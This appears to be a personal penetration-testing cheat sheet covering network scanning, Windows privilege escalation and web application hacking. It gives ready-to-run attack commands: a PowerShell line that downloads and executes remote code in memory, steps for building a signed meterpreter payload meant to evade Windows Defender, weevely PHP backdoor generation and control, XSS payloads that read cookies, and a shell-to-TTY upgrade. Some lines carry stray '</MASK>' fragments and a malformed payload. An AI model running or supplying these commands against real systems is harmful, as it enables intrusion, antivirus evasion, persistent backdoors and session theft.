Table of Contents
=================

   * [Reconnaissance &amp; Gathering](#reconnaissance--gathering)
      * [Mapping the Network](#mapping-the-network)
      * [NBTscan](#nbtscan)
      * [Nmap scan basics](#nmap-scan-basics)
   * [PowerShell](#powershell)
      * [To load a PS module into the memory](#to-load-a-ps-module-into-the-memory)
      * [Sharing files with Windows machine](#sharing-files-with-windows-machine)
   * [PrivEsc on Windows](#privesc-on-windows)
      * [Bypassing Windows Defender](#bypassing-windows-defender)
   * [WebApplication Hacking](#webapplication-hacking)
      * [Create a PHP Backdoor shell](#create-a-php-backdoor-shell)
      * [Check for broken links to hijack](#check-for-broken-links-to-hijack)
   * [Utils](#utils)
      * [Shell to TTY](#shell-to-tty)

Created by [gh-md-toc](https://github.com/ekalinin/github-markdown-toc)

# Reconnaissance & Gathering
## Mapping the Network
If we wanted to check for machines on the subnet with SMB signing not enabled, we can use RunFinger.py which is in the responder toolset.
```bash
responder-RunFinger -i [IP_ADDRESS]</MASK>
responder-RunFinger -i 10.0.2.0/24
```
## NBTscan
It will scan IP networks for NetBIOS accesible information.
```bash
nbtscan -v -s : 192.168.1.0/24
```
## Nmap scan basics
The well-known nmap program will scan for reachable host and its version, possible vulnerabilities...
```bash
nmap -p- -sV -sS -T4 -oA nmap-output [IP]</MASK>
```
Additionaly, you can run it with:
* -sC: This will try to run some default scripts over the services
* -sV: Get the service version

# PowerShell
## To load a PS module into the memory
```powershell
powershell.exe -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString($URL);"
# Here call the modules you want to execute, depending on the usage of what you have downloaded
```
## Sharing files with Windows machine
**NOTE:** This technique is usefull also to share files with any Windows VM *(or the parent host)*
```bash
impacket-smbserver share [path] -smb2support
```
# PrivEsc on Windows
## Bypassing Windows Defender
There're a [usefull scripts](https://astr0baby.wordpress.com/2019/01/26/custom-meterpreter-loader-in-2019/), from **Astr0baby's blog**, just copy-paste them.

**NOTE:** There're some replaces needed in the listener.sh script:

1. *Line 12:* remove the ./ from the call to msfconsole
2. *Line 16:* add -job after the run sentence

```bash
./msf-loader.sh
# introduce LHOST
# introduce LPORT
# domain to impersonate?
# The process should have created a 'payload.exe' and also 'payload-signed.exe'
./listener.sh
# Define the LHOST
# Define the LPORT
# Now the payload shall be ran into the target
```

# WebApplication Hacking
## Create a PHP Backdoor shell
The software named **weevely** will help on this matter. It's a software that crates the php file to upload to the exploited
server.

```bash
# Generate new agent
weevely generate <password> <path>
# Run terminal or command on the target
weevely <URL> <password> [cmd]
# Recover an existing session
weevely session <path> [cmd]
```
## Steal cookies abusing of XSS vulnerability
```js
alert(self['alert'](self['document']['cookie'])
alert(document.cookie)
```

## Check for broken links to hijack
**broken-link-checker** will crawl a target and look for broken links. Whenever I use this tool I like to run:

```bash
blc -rof --filter-level 3 https://example.com/
```
Adapting it to something like this in order to prevent false positives:
```bash
blc -rfoi --exclude linkedin.com --exclude youtube.com --filter-level 3 https://example.com/
```

# Utils
## Shell to TTY
```bash
python -c "import pty;pty.spawn('/bin/bash')"
Ctrl + z
stty raw -echo
fg
```
